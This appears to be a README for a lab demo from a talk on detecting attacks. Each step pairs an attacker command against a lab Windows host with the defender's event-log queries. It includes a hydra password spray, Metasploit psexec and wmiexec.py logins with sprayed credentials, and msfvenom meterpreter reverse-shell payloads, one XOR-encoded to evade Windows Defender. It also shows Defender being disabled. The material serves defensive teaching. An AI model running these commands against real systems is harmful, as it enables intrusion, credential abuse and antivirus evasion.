# Demo

## Attacker launches password spray

### Attacker

Password spray: `hydra -L users.txt -P seasons-2023.txt 192.168.37.237 smb -u`

<img width="774" alt="hydra" src="https://github.com/eric-conrad/c2-talk/assets/14989334/5889e132-8050-4136-a7a2-90c7fe344872">

### Defender 

Count successful (4624) and failed (4625) logins:

`Get-WinEvent -Path C:\labs\valkyrie-security-logons.evtx | Group-Object id -NoElement | sort count`

## Attacker uses sprayed credentials to attempt to log in via Metasplot's psexec

### Attacker

```
msfconsole
msf6 > use exploit/windows/smb/psexec
msf6 > set RHOSTS 192.168.37.237
msf6 > set SMBUser fgaeta
msf6 > set SMBPass W1nter2023!
msf6 > exploit
```

<img width="540" alt="image" src="https://github.com/eric-conrad/c2-talk/assets/14989334/33b73450-2f72-4154-adb8-e4df73605205">

### Defender

Service was created (before Defender killed it):

`Get-WinEvent @{Path="C:\labs\valkyrie-system.evtx"; ID=7045}| fl`

Command was executed (event 4688):

`Get-WinEvent @{Path="C:\labs\valkyrie-security.evtx";id=4688}| Where {$_.Message -like "*powershell.exe -nop*"} | fl`

Windows Defender Antivirus killed the connection:

`Get-WinEvent @{Path="C:\labs\valkyrie-defender.evtx";id=1117} | fl`

## Attacker logs in with wmiexec.py:

### Attacker
`wmiexec.py fgaeta:W1nter2023\!@192.168.37.237`

<img width="558" alt="image" src="https://github.com/eric-conrad/c2-talk/assets/14989334/8d7f5896-91be-41d1-9b31-ac312b38ddd4">

### Defender

Microsoft Defender Antivirus: zero logs.

Sysmon event 1 (and security event 4688) shows `WmiPrvSE.exe` launching `cmd.exe` and redirecting to the `ADMIN$` share:

`Get-WinEvent @{Path="C:\labs\valkyrie-sysmon.evtx";id=1} | Where {$_.Message -like "*ADMIN$*"}|fl`

## Attacker creates plan.exe with msfvenom:

### Attacker

`msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.37.203 LPORT=8080 -x notepad.exe -f exe > plan.exe`

![image](https://github.com/eric-conrad/c2-talk/assets/14989334/39d67f6f-d25f-49fb-8935-5765d78dfbe8)

Attacker uploads `plan.exe` via wmiexex.py's `lput`, tries to run it, and fails:

<img width="495" alt="image" src="https://github.com/eric-conrad/c2-talk/assets/14989334/4fd06aff-b3eb-4104-9fb8-20f0b9436408">

### Defender

The command executed:

`Get-WinEvent @{Path="C:\labs\valkyrie-sysmon.evtx";id=1} | Where {$_.Message -like "*Image: C:\Users\fgaeta\plan.exe*"} | fl`

Then Windows Defender killed it:

`Get-WinEvent @{Path="C:\labs\valkyrie-defender.evtx";id=1116} | Where {$_.Message -like "*plan.exe*"} | fl | more`

## Attacker uses xor encoding and re-uploads plan.exe

### Attacker

`msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.37.203 LPORT=8080 -i 10 -e x64/xor_dynamic -x notepad.exe -f exe > plan.exe`

The key difference: `-e x64/xor_dynamic`

![image](https://github.com/eric-conrad/c2-talk/assets/14989334/67d3616d-4c33-4ce9-b5b0-7c397cc24bcc)

Upload and execute:

<img width="400" alt="image" src="https://github.com/eric-conrad/c2-talk/assets/14989334/15e2a3bc-083e-444a-8c6d-681ac8da9389">

Reverse meterpreter shell connects to Metasploit:

<img width="403" alt="image" src="https://github.com/eric-conrad/c2-talk/assets/14989334/313a979c-d5fe-4383-86f9-147d30a1d263">

## Attacker runs getsystem

### Attacker

`getsystem` fails, so the attacker enables RDP

<img width="397" alt="image" src="https://github.com/eric-conrad/c2-talk/assets/14989334/758351dd-3b7c-4302-bd6f-e1783947191b">

The attacker then logs in via RDP and disables Windows Defender Antivirus:

<img width="397" alt="image" src="https://github.com/eric-conrad/c2-talk/assets/14989334/61b6b6a6-c0b8-420b-b644-600e058fa8f5">

### Defender

Windows Defender Antivirus kills the `getsystem` command

`Get-WinEvent @{Path="C:\labs\valkyrie-defender.evtx";id=1117} | fl | more`



